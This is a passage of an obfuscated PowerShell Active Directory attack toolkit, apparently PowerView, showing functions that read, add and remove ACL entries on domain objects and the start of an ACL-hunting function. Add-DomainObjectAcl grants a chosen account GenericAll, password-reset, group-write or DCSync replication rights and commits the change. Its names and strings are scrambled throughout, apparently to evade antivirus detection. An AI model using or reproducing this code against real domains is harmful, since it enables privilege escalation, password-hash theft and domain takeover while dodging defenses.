        if ( $PSBoundParameters[("{3}{1}{2}{0}"-f'mit','v','erTimeLi','Ser')]  ) { $DomainGUIDMapArguments[("{4}{1}{2}{0}{3}"-f 'imeLimi','ver','T','t','Ser'  )]  =  $ServerTimeLimit }
        if ($PSBoundParameters[(  "{1}{2}{0}" -f 'ial','Cre','dent')]) { $DomainGUIDMapArguments[(  "{1}{0}{2}{3}" -f 'ent','Cred','i','al'  )]  = $Credential }

        
        if (  $PSBoundParameters[( "{1}{3}{0}{2}"-f'eGUI','Res','Ds','olv' )]  ) {
            $GUIDs   = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (  $Searcher) {
            $IdentityFilter   =  ''
            $Filter  = ''
            $Identity | Where-Object {$_}  |  ForEach-Object {
                $IdentityInstance   =   $_.replace( '(', '\28' ).REPlAcE( ')', '\29' )
                if (  $IdentityInstance -match (  "{1}{0}" -f'.*','^S-1-' ) ) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif (  $IdentityInstance -match ((  ("{1}{3}{0}{2}" -f')=.','^(CN{0}OU{','*','0}DC'))  -f  [cHAr]124  ) ) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if (( -not $PSBoundParameters[(  "{1}{0}"-f 'omain','D')] ) -and (-not $PSBoundParameters[("{0}{1}{2}" -f 'Sea','rc','hBase')] )) {
                        
                        
                        $IdentityDomain =  $IdentityInstance.sUBStrInG($IdentityInstance.inDEXOF('DC=' )) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ('[G'+ 'et'  + '-DomainOb'  +'j'+ 'e'+'ctAcl' + '] '  +'Ext'  +  'rac' + 'ted ' +  'domai' +  'n'  + ' '  +  "'$IdentityDomain' "+ 'fro' +  'm ' +  "'$IdentityInstance'")
                        $SearcherArguments[("{1}{0}" -f 'in','Doma')]   =   $IdentityDomain
                        $Searcher =  Get-DomainSearcher @SearcherArguments
                        if (  -not $Searcher ) {
                            Write-Warning ('[G'  +  'et-' + 'D'+ 'omainObject'  +'Acl] '+'U'  +'na'  +  'ble ' +  'to'+' '+ 'retrie'  +  've ' +  'doma'+'in '+'sea'+  'rc'+ 'her '+  'fo' +  'r '  +"'$IdentityDomain'")
                        }
                    }
                }
                elseif ( $IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString   =  ( ( [Guid]$IdentityInstance  ).ToBYtEaRRAy( )   |   ForEach-Object { '\'  +   $_.tostring( 'X2'  ) }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.ContAInS(  '.'  )) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (  $IdentityFilter -and ($IdentityFilter.tRiM(  ) -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if (  $PSBoundParameters[("{1}{0}{2}" -f'e','LDAPFilt','r'  )] ) {
                Write-Verbose (  '[Get-Do'+ 'ma'  + 'i'+  'n' +  'Obje' +'ct'+  'Acl] ' + 'Us' +  'i'  + 'ng ' +  'addit'  + 'ional' +' '+  'LDAP'  +  ' ' +  'fil' +'t'+'er: '+  "$LDAPFilter" )
                $Filter += "$LDAPFilter"
            }

            if (  $Filter) {
                $Searcher.FiLtEr   =  "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter) "

            $Results   =   $Searcher.findall()
            $Results   | Where-Object {$_}   |   ForEach-Object {
                $Object   =  $_.pRopErtIeS

                if ( $Object.oBjEcTSid -and $Object.oBJEctsId[0]  ) {
                    $ObjectSid =   (New-Object ( 'S' + 'ystem.'+'Securi'  +'ty'+ '.Pri' +'n'+  'cipal.Secur'+ 'it' + 'yId' +'e'+ 'nti'  +'fier')( $Object.oBjecTSId[0],0 )).VALue
                }
                else {
                    $ObjectSid = $Null
                }

                try {
                    New-Object ('Sec'  + 'urity'+  '.AccessC'+  'ontrol.' +  'Raw'  + 'Se'+'curi'+  'ty'  +  'Desc' +'ript'+ 'or') -ArgumentList $Object[(  "{4}{0}{1}{2}{3}"-f 'curit','yd','escrip','tor','ntse'  )][0], 0   | ForEach-Object { if ($PSBoundParameters[(  "{1}{0}"-f'cl','Sa' )]  ) {$_.SYsTeMACL} else {$_.DiSCretioNaRyAcl} }   |   ForEach-Object {
                        if ( $PSBoundParameters[("{0}{1}{2}"-f 'RightsFi','l','ter'  )]  ) {
                            $GuidFilter  =   Switch ( $RightsFilter  ) {
                                ("{2}{0}{1}" -f 'Pass','word','Reset') { (  "{5}{0}{4}{6}{2}{1}{3}" -f'99570-2','006e05','aa','29','46d-11d0-a76','002','8-00'  ) }
                                ("{0}{3}{1}{2}" -f'Write','e','rs','Memb' ) { (  "{1}{3}{4}{0}{6}{5}{2}" -f'-a','b','9e2','f9679c0-0de6-11','d0','85-00aa00304','2'  ) }
                                (  'Def' + 'ault' ) { ("{1}{2}{3}{6}{5}{4}{0}" -f '0','000','000','00-0000-00','000000000','0-00','00-000' ) }
                            }
                            if ($_.objECttYpE -eq $GuidFilter) {
                                $_  |  Add-Member (  'Not' +  'e'+  'Propert'  +'y' ) ("{1}{0}" -f'jectDN','Ob'  ) $Object.DIsTinGUISHednAME[0]
                                $_  | Add-Member ('Not'  + 'ePrope'  +  'r'+'ty') (  "{2}{1}{0}" -f 'ID','tS','Objec' ) $ObjectSid
                                $Continue = $True
                            }
                        }
                        else {
                            $_   | Add-Member ( 'N'  + 'otePr'+  'ope' + 'rty') (  "{0}{1}{2}"-f'Objec','tD','N'  ) $Object.DisTiNguIshednaMe[0]
                            $_ |  Add-Member ( 'NoteProp'+ 'e'  +'rt'  +'y'  ) (  "{1}{0}" -f'tSID','Objec'  ) $ObjectSid
                            $Continue  =   $True
                        }

                        if (  $Continue ) {
                            $_  |  Add-Member ( 'Not'  +  'ePr' +  'o' + 'perty'  ) (  "{4}{1}{2}{3}{5}{0}" -f'ryRights','ctiveD','irec','t','A','o'  ) ([Enum]::ToObJeCT( [System.DirectoryServices.ActiveDirectoryRights], $_.ACCeSsmAsk  )  )
                            if (  $GUIDs) {
                                
                                $AclProperties  =  @{}
                                $_.pSobJECT.PRoperties  |  ForEach-Object {
                                    if ( $_.naMe -match ((( "{0}{1}{10}{3}{2}{9}{5}{8}{7}{13}{4}{11}{12}{6}" -f'O','b','Inhe','ype{0}','dO','tType{0}Obje','pe','nherit','ctAceType{0}I','ritedObjec','jectT','b','jectAceTy','e' )  )  -f[cHar]124) ) {
                                        try {
                                            $AclProperties[$_.NaME]   =  $GUIDs[$_.vALUe.TOstRiNG(   )]
                                        }
                                        catch {
                                            $AclProperties[$_.naME] =   $_.ValUe
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.nAMe]  =  $_.vaLuE
                                    }
                                }
                                $OutObject =  New-Object -TypeName ('PSObj'+'ect') -Property $AclProperties
                                $OutObject.psOBJECt.tYpenAmeS.iNSeRT( 0, ( "{4}{2}{1}{3}{0}" -f'L','View.','wer','AC','Po' ))
                                $OutObject
                            }
                            else {
                                $_.PsOBjecT.tyPeNaMes.iNSERt(  0, ("{1}{3}{2}{0}"-f '.ACL','PowerV','w','ie' ) )
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose (  '['+  'Get' +'-' +  'D'+'omainOb'+ 'jectA'+'cl] ' +'Err'  + 'o'  + 'r: '+  "$_" )
                }
            }
        }
    }
}


function add-D`oM`A`INoB`J`EC`TaCL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{1}{0}{2}" -f 'SShouldPr','P','ocess'}, ''  )]
    [CmdletBinding( )]
    Param ( 
        [Parameter(PoSItiOn   =  0, VaLuEfrOMpIpeLiNe = $True, VAluEFrOmPipelInEbYProPeRTYNaMe = $True )]
        [Alias({"{2}{1}{0}{3}"-f 'ishedNa','ingu','Dist','me'}, {"{2}{3}{1}{0}"-f'ame','ntN','Sam','Accou'}, {"{0}{1}" -f'N','ame'})]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty( )]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{1}{0}" -f'r','Filte'} )]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty(    )]
        [String]
        $TargetSearchBase,

        [Parameter(MaNdAtORy  =  $True )]
        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty( )]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty(  )]
        [Alias(  {"{2}{1}{0}" -f 'ontroller','mainC','Do'} )]
        [String]
        $Server,

        [ValidateSet( {"{1}{0}"-f'ase','B'}, {"{2}{0}{1}"-f 'ev','el','OneL'}, {"{1}{0}{2}" -f'b','Su','tree'}  )]
        [String]
        $SearchScope =   ("{0}{1}" -f 'Su','btree'  ),

        [ValidateRange( 1, 10000  )]
        [Int]
        $ResultPageSize   = 200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential   =   [Management.Automation.PSCredential]::EmptY,

        [ValidateSet( 'All', {"{0}{1}{2}" -f 'Res','etP','assword'}, {"{2}{1}{0}"-f 'eMembers','it','Wr'}, {"{0}{1}" -f 'DCS','ync'})]
        [String]
        $Rights =   'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments   = @{
            ("{1}{0}{2}" -f 'e','Properti','s')   =  ("{2}{4}{1}{3}{0}"-f 'e','ishe','disting','dnam','u' )
            'Raw' = $True
        }
        if (  $PSBoundParameters[("{0}{2}{1}"-f 'Targe','ain','tDom' )]) { $TargetSearcherArguments[( "{0}{1}"-f'Doma','in' )]   =  $TargetDomain }
        if (  $PSBoundParameters[(  "{2}{3}{0}{1}" -f 'LDAPFi','lter','Tar','get' )]) { $TargetSearcherArguments[( "{0}{1}{2}"-f 'LD','AP','Filter' )]   =  $TargetLDAPFilter }
        if ($PSBoundParameters[(  "{2}{0}{3}{1}"-f'etS','archBase','Targ','e'  )] ) { $TargetSearcherArguments[( "{0}{2}{3}{1}"-f 'S','e','ear','chBas' )] = $TargetSearchBase }
        if ( $PSBoundParameters[(  "{0}{1}{2}"-f'S','e','rver')] ) { $TargetSearcherArguments[("{0}{1}"-f'Ser','ver')]   = $Server }
        if ( $PSBoundParameters[( "{0}{1}{2}" -f'Searc','hScop','e'  )]) { $TargetSearcherArguments[("{2}{1}{0}"-f'ope','rchSc','Sea')] =   $SearchScope }
        if ($PSBoundParameters[( "{3}{1}{0}{2}"-f 'z','ageSi','e','ResultP' )]  ) { $TargetSearcherArguments[(  "{1}{0}{2}"-f'eSiz','ResultPag','e'  )]   = $ResultPageSize }
        if (  $PSBoundParameters[(  "{0}{1}{2}" -f 'Serve','rTimeLim','it' )]  ) { $TargetSearcherArguments[( "{4}{0}{1}{2}{3}"-f'r','verTimeLim','i','t','Se')]   =  $ServerTimeLimit }
        if ($PSBoundParameters[( "{1}{2}{0}" -f'e','Tombst','on')]  ) { $TargetSearcherArguments[("{1}{0}{2}{3}"-f'o','T','m','bstone')]   =  $Tombstone }
        if ( $PSBoundParameters[( "{0}{2}{1}" -f 'Cre','ntial','de')]) { $TargetSearcherArguments[(  "{0}{1}{2}"-f 'Credenti','a','l'  )] = $Credential }

        $PrincipalSearcherArguments = @{
            ( "{1}{0}"-f 'entity','Id')  = $PrincipalIdentity
            ( "{2}{0}{1}" -f 'p','erties','Pro') =  ("{1}{5}{0}{2}{6}{4}{3}{7}"-f'na','distin','me,ob','ctsi','e','guished','j','d'  )
        }
        if (  $PSBoundParameters[(  "{1}{2}{0}" -f 'Domain','Pri','ncipal' )]  ) { $PrincipalSearcherArguments[( "{0}{1}{2}" -f'Doma','i','n'  )] =   $PrincipalDomain }
        if ( $PSBoundParameters[( "{2}{0}{1}" -f'r','ver','Se'  )]) { $PrincipalSearcherArguments[("{0}{1}"-f 'Ser','ver' )]   =   $Server }
        if ($PSBoundParameters[( "{2}{1}{0}" -f 'e','hScop','Searc')]  ) { $PrincipalSearcherArguments[(  "{1}{2}{0}{3}"-f 'op','Search','Sc','e' )]  = $SearchScope }
        if ($PSBoundParameters[( "{3}{4}{2}{1}{0}"-f'ize','PageS','lt','Re','su'  )]  ) { $PrincipalSearcherArguments[("{2}{3}{0}{1}{4}"-f 'a','geSi','Resul','tP','ze' )] =  $ResultPageSize }
        if (  $PSBoundParameters[(  "{3}{0}{4}{2}{1}"-f'rverT','t','eLimi','Se','im')] ) { $PrincipalSearcherArguments[( "{0}{1}{3}{4}{2}"-f 'Se','rverTi','it','m','eLim'  )]   = $ServerTimeLimit }
        if (  $PSBoundParameters[( "{1}{0}{2}"-f 't','Tombs','one')]  ) { $PrincipalSearcherArguments[( "{0}{1}{2}"-f'Tom','b','stone' )]  =   $Tombstone }
        if (  $PSBoundParameters[("{1}{0}{2}" -f'e','Cr','dential')] ) { $PrincipalSearcherArguments[("{2}{3}{0}{1}" -f'ent','ial','Cr','ed' )] =   $Credential }
        $Principals  = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals ) {
            throw ( 'Una'+'ble '+'t'  +'o ' + 'r' + 'esolve '  +'p'+'rincipa' + 'l: ' +  "$PrincipalIdentity" )
        }
    }

    PROCESS {
        $TargetSearcherArguments[( "{1}{0}{2}"-f't','Iden','ity'  )]  =   $TargetIdentity
        $Targets  =  Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets ) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ( "{1}{0}"-f'one','N')
            $ControlType = [System.Security.AccessControl.AccessControlType] (  "{0}{1}"-f 'Allo','w')
            $ACEs  =   @()

            if ($RightsGUID  ) {
                $GUIDs   =  @($RightsGUID )
            }
            else {
                $GUIDs   =  Switch ( $Rights ) {
                    
                    (  "{0}{3}{2}{1}" -f 'Rese','d','asswor','tP'  ) { ("{3}{1}{6}{8}{4}{7}{2}{5}{0}" -f '0529','299570-2','6','00','11','e','46d','d0-a768-00aa00','-'  ) }
                    
                    (  "{3}{2}{0}{1}" -f'e','mbers','eM','Writ') { ( "{1}{6}{2}{4}{5}{8}{10}{3}{0}{9}{7}"-f '0','bf','0-0de6-','aa','11d0-','a','9679c','49e2','285-0','030','0'  ) }
                    
                    
                    
                    
                    ("{1}{0}" -f'c','DCSyn'  ) { ( "{2}{4}{1}{6}{5}{3}{0}" -f 'fc2dcd2','11d1','1131f6aa-9c07','f-00c04','-','79','-f' ), (  "{8}{5}{2}{6}{7}{4}{9}{1}{3}{0}" -f 'd2','f-00c0','6ad-9c0','4fc2dc','-f7','1f','7-1','1d1','113','9' ), ( "{8}{5}{9}{1}{2}{0}{6}{3}{4}{7}"-f'2-','-4','c6','0f','acbeda640','e','991a-','c','89','95b76-444d')}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) "

                try {
                    $Identity  =  [System.Security.Principal.IdentityReference] ( [System.Security.Principal.SecurityIdentifier]$PrincipalObject.OBJeCtSID)

                    if ($GUIDs ) {
                        ForEach ( $GUID in $GUIDs  ) {
                            $NewGUID = New-Object ('Gu'  + 'id') $GUID
                            $ADRights  =  [System.DirectoryServices.ActiveDirectoryRights] ("{0}{1}{2}{3}" -f'Ex','te','n','dedRight')
                            $ACEs += New-Object (  'S' +'ys' +'tem.DirectoryS'  +'ervice' + 's.Ac' + 't' + 'iv'+  'eDire' + 'ctoryAccessRule' ) $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        
                        $ADRights =  [System.DirectoryServices.ActiveDirectoryRights] (  "{2}{1}{0}" -f'icAll','r','Gene')
                        $ACEs += New-Object (  'Sy'+'s' +  'tem.Direc'  + 'torySe' + 'rvic'+'es.Activ'  +'e'+  'Dire' +'ct' + 'oryA'+'ccessR'+'ule'  ) $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        $TargetEntry   =  $TargetObject.GetDirEctOryENtRY()
                        $TargetEntry.psbasE.oPtiONs.SEcurItymaSKs   =  ( "{1}{0}" -f 'l','Dac'  )
                        $TargetEntry.psBasE.obJEcTsEcUritY.ADdAcceSSruLe(  $ACE)
                        $TargetEntry.PsbASE.CoMmiTChAnges(  )
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function R`EMOV`E-`dOMAiNobj`e`C`TACl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{2}{0}{4}{3}{1}"-f'o','ss','PSSh','ce','uldPro'}, '' )]
    [CmdletBinding(   )]
    Param ( 
        [Parameter( POsitIon  = 0, valuEFRomPipELinE =  $True, VALUeFROmpipELINEBYPropeRTynAme  = $True )]
        [Alias( {"{0}{1}{2}{3}"-f'Distingu','ish','edNa','me'}, {"{4}{0}{3}{2}{1}"-f'u','e','am','ntN','SamAcco'}, {"{0}{1}"-f 'Nam','e'}  )]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty(    )]
        [Alias({"{2}{0}{1}" -f'te','r','Fil'})]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $TargetSearchBase,

        [Parameter(  mandAtorY = $True )]
        [ValidateNotNullOrEmpty(   )]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty( )]
        [Alias(  {"{1}{0}{3}{4}{2}" -f 'nCon','Domai','er','tro','ll'}  )]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{1}{0}{2}"-f'e','On','Level'}, {"{0}{1}" -f'Subtr','ee'})]
        [String]
        $SearchScope =   (  "{1}{0}"-f 'btree','Su'),

        [ValidateRange(  1, 10000)]
        [Int]
        $ResultPageSize   =  200,

        [ValidateRange(1, 10000 )]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential = [Management.Automation.PSCredential]::eMptY,

        [ValidateSet('All', {"{2}{1}{0}" -f 'ssword','setPa','Re'}, {"{1}{2}{0}{3}" -f 'be','Write','Mem','rs'}, {"{0}{1}" -f'DCSy','nc'}  )]
        [String]
        $Rights =  'All',

        [Guid]
        $RightsGUID
     )

    BEGIN {
        $TargetSearcherArguments =  @{
            (  "{1}{0}{2}" -f'perti','Pro','es' )   =   ( "{0}{1}{2}{3}{4}" -f'd','isting','uished','na','me')
            'Raw'  =   $True
        }
        if (  $PSBoundParameters[("{2}{1}{0}"-f'omain','etD','Targ')]  ) { $TargetSearcherArguments[( "{0}{1}"-f'D','omain' )] = $TargetDomain }
        if (  $PSBoundParameters[("{0}{2}{1}{3}{4}" -f'Target','lt','LDAPFi','e','r' )] ) { $TargetSearcherArguments[( "{0}{2}{3}{1}" -f 'LD','lter','A','PFi')]   =  $TargetLDAPFilter }
        if (  $PSBoundParameters[( "{4}{3}{1}{2}{0}" -f 'hBase','Sear','c','et','Targ')]  ) { $TargetSearcherArguments[(  "{0}{1}{3}{2}"-f 'Search','B','e','as' )] =  $TargetSearchBase }
        if (  $PSBoundParameters[(  "{0}{2}{1}"-f'Se','er','rv'  )]  ) { $TargetSearcherArguments[(  "{1}{0}{2}" -f'erve','S','r'  )] = $Server }
        if ( $PSBoundParameters[(  "{0}{1}{2}" -f 'Searc','h','Scope'  )]) { $TargetSearcherArguments[( "{3}{2}{1}{0}" -f 'e','op','Sc','Search' )] =  $SearchScope }
        if ($PSBoundParameters[(  "{3}{2}{1}{0}"-f'e','geSiz','tPa','Resul')]  ) { $TargetSearcherArguments[("{0}{3}{2}{1}"-f'Re','ize','ultPageS','s')]   =   $ResultPageSize }
        if (  $PSBoundParameters[(  "{0}{1}{2}{4}{3}" -f'S','erver','Tim','mit','eLi')] ) { $TargetSearcherArguments[(  "{2}{3}{0}{1}" -f 'me','Limit','ServerT','i')]   = $ServerTimeLimit }
        if ($PSBoundParameters[(  "{1}{0}{2}"-f 'ton','Tombs','e' )] ) { $TargetSearcherArguments[( "{1}{0}{2}" -f 'mbst','To','one')] = $Tombstone }
        if (  $PSBoundParameters[(  "{1}{2}{0}{3}"-f'ti','Crede','n','al'  )] ) { $TargetSearcherArguments[("{2}{1}{0}" -f'edential','r','C')] =  $Credential }

        $PrincipalSearcherArguments  = @{
            ("{1}{0}" -f'dentity','I' ) =  $PrincipalIdentity
            (  "{0}{1}{2}" -f 'Pro','pertie','s'  )  =  (  "{3}{0}{1}{4}{5}{2}"-f'uishedname,o','b','id','disting','je','cts'  )
        }
        if ( $PSBoundParameters[( "{2}{1}{4}{3}{0}" -f'n','pa','Princi','i','lDoma'  )]) { $PrincipalSearcherArguments[(  "{1}{0}"-f'in','Doma')] =  $PrincipalDomain }
        if ( $PSBoundParameters[("{1}{0}" -f'r','Serve'  )]) { $PrincipalSearcherArguments[(  "{0}{2}{1}" -f'Se','r','rve')]  =  $Server }
        if ( $PSBoundParameters[( "{2}{1}{0}"-f'e','archScop','Se')]  ) { $PrincipalSearcherArguments[(  "{1}{2}{0}{3}"-f'S','Se','arch','cope')]  =   $SearchScope }
        if ($PSBoundParameters[("{3}{2}{1}{0}{4}"-f 'geS','ltPa','esu','R','ize')] ) { $PrincipalSearcherArguments[(  "{2}{3}{1}{0}"-f'Size','ge','Resu','ltPa' )]  =  $ResultPageSize }
        if ( $PSBoundParameters[("{3}{0}{2}{1}"-f 'Ti','it','meLim','Server')]) { $PrincipalSearcherArguments[( "{2}{1}{3}{0}{4}"-f'erTim','er','S','v','eLimit' )]  = $ServerTimeLimit }
        if ( $PSBoundParameters[(  "{0}{2}{1}"-f 'Tomb','e','ston')]  ) { $PrincipalSearcherArguments[("{0}{1}" -f 'T','ombstone'  )] = $Tombstone }
        if (  $PSBoundParameters[(  "{2}{1}{3}{0}"-f'l','nti','Crede','a' )] ) { $PrincipalSearcherArguments[( "{3}{1}{0}{2}" -f'e','ed','ntial','Cr')]   =  $Credential }
        $Principals   =   Get-DomainObject @PrincipalSearcherArguments
        if (  -not $Principals  ) {
            throw ( 'U'  + 'nable '+  'to' +' '  + 'resol'  +  've' +  ' ' +'p'  +'r' + 'i' + 'ncipal: '+  "$PrincipalIdentity")
        }
    }

    PROCESS {
        $TargetSearcherArguments[( "{0}{2}{1}"-f'Ident','y','it'  )]   = $TargetIdentity
        $Targets   =   Get-DomainObject @TargetSearcherArguments

        ForEach ( $TargetObject in $Targets ) {

            $InheritanceType  =  [System.DirectoryServices.ActiveDirectorySecurityInheritance] (  "{0}{1}" -f'Non','e' )
            $ControlType = [System.Security.AccessControl.AccessControlType] ("{0}{1}"-f'A','llow'  )
            $ACEs =  @( )

            if ( $RightsGUID ) {
                $GUIDs  = @($RightsGUID  )
            }
            else {
                $GUIDs  =   Switch ($Rights ) {
                    
                    ( "{3}{1}{2}{0}"-f 'rd','esetP','asswo','R' ) { ( "{1}{8}{5}{7}{4}{2}{3}{6}{0}"-f'529','00','-00a','a006e','8','0-246d-1','0','1d0-a76','29957' ) }
                    
                    ("{1}{2}{0}"-f 's','WriteMembe','r'  ) { ("{3}{0}{4}{5}{1}{2}{6}" -f '79c0-0','0-a285-00aa00','3049','bf96','de6-','11d','e2'  ) }
                    
                    
                    
                    
                    (  "{0}{2}{1}"-f 'DCS','c','yn'  ) { ("{4}{3}{9}{6}{8}{0}{1}{7}{5}{2}" -f '9f','-00','cd2','-9c','1131f6aa','d','1d1-','c04fc2','f7','07-1' ), ( "{3}{8}{6}{9}{0}{1}{2}{4}{7}{5}"-f'-','f79f','-','113','00c0','cd2','f6ad-9','4fc2d','1','c07-11d1'), ("{7}{5}{1}{4}{3}{0}{6}{9}{2}{8}" -f '1a-0f','44','6','9','4d-4c62-9','95b76-','acb','89e','40c','eda')}
                }
            }

            ForEach ( $PrincipalObject in $Principals) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) "

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.oBjeCtsid )

                    if ($GUIDs  ) {
                        ForEach ($GUID in $GUIDs ) {
                            $NewGUID =  New-Object ( 'Gui'+ 'd') $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] (  "{0}{3}{4}{2}{1}"-f'Exte','t','dRigh','n','de' )
                            $ACEs += New-Object ('S' +  'ystem.Dire'  +  'ctoryService'  + 's'+ '.' +'ActiveDi'+ 'rector' + 'y'  + 'AccessRu'+ 'l' +'e'  ) $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ( "{2}{1}{0}" -f 'll','ericA','Gen'  )
                        $ACEs += New-Object ('Sy' +  'stem.Direct'+  'ory'  +  'Services.ActiveDi'  +  'rec'+  't'+ 'oryAc'  +'ces' + 'sRule') $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    
                    ForEach ( $ACE in $ACEs ) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        $TargetEntry =   $TargetObject.gEtdIReCtorYEnTrY(    )
                        $TargetEntry.Psbase.optionS.SecURiTYMasks = ("{0}{1}"-f 'D','acl'  )
                        $TargetEntry.psbAsE.ObjECtSECURity.rEmoVeACcessrULe(  $ACE)
                        $TargetEntry.PSbAse.COMmItCHAnges(   )
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function f`i`Nd`-iNt`ER`e`sTinGdOmaiN`AcL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{3}{1}{2}{0}"-f'ldProcess','S','Shou','P'}, '')]
    [OutputType(  {"{1}{2}{0}"-f'ew.ACL','P','owerVi'} )]
    [CmdletBinding()]
    Param (
        [Parameter(  POsITiOn  =  0, vaLUEfROMpIPELINe  =  $True, valUeFrOMPIPeLineByPropERtYnAMe   =  $True  )]
        [Alias(  {"{2}{1}{0}" -f 'nName','mai','Do'}, {"{0}{1}"-f 'N','ame'})]
        [String]
        $Domain,

        [Switch]
        $ResolveGUIDs,

        [String]
        [ValidateSet('All', {"{2}{0}{1}{3}" -f 'tP','asswo','Rese','rd'}, {"{3}{1}{0}{2}" -f'emb','M','ers','Write'}  )]
        $RightsFilter,

        [ValidateNotNullOrEmpty( )]
        [Alias({"{1}{0}"-f 'ilter','F'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty( )]
        [Alias( {"{1}{0}"-f'th','ADSPa'}  )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty( )]
        [Alias({"{0}{2}{4}{3}{1}"-f 'Doma','r','inC','rolle','ont'} )]
        [String]
        $Server,

        [ValidateSet( {"{1}{0}"-f 'ase','B'}, {"{2}{0}{1}"-f'neL','evel','O'}, {"{2}{1}{0}" -f 'e','re','Subt'}  )]
        [String]
        $SearchScope   =  ( "{1}{0}{2}"-f 'tre','Sub','e'),

        [ValidateRange( 1, 10000)]
        [Int]
        $ResultPageSize   = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential =  [Management.Automation.PSCredential]::EMptY
     )

    BEGIN {
        $ACLArguments = @{}
        if ($PSBoundParameters[(  "{3}{2}{0}{1}"-f'v','eGUIDs','l','Reso'  )] ) { $ACLArguments[("{0}{3}{1}{2}" -f'Reso','veGUI','Ds','l' )] =   $ResolveGUIDs }
        if (  $PSBoundParameters[( "{1}{0}{2}" -f'ghtsFi','Ri','lter'  )]  ) { $ACLArguments[("{2}{1}{0}"-f 'htsFilter','g','Ri')]   =   $RightsFilter }
        if (  $PSBoundParameters[("{2}{0}{1}{3}"-f'APFi','lt','LD','er'  )]  ) { $ACLArguments[(  "{1}{0}{2}"-f 'AP','LD','Filter'  )]   =   $LDAPFilter }
        if ($PSBoundParameters[("{0}{1}{2}"-f'Sea','rc','hBase' )]  ) { $ACLArguments[("{0}{1}{2}"-f'S','earchBas','e' )]  =  $SearchBase }
        if ( $PSBoundParameters[(  "{0}{1}{2}" -f'S','er','ver' )]  ) { $ACLArguments[( "{1}{0}{2}" -f 'er','S','ver' )]  =  $Server }
        if ( $PSBoundParameters[(  "{2}{3}{0}{1}"-f'hSc','ope','S','earc' )]) { $ACLArguments[(  "{0}{1}{2}" -f'SearchSco','p','e')]  =  $SearchScope }
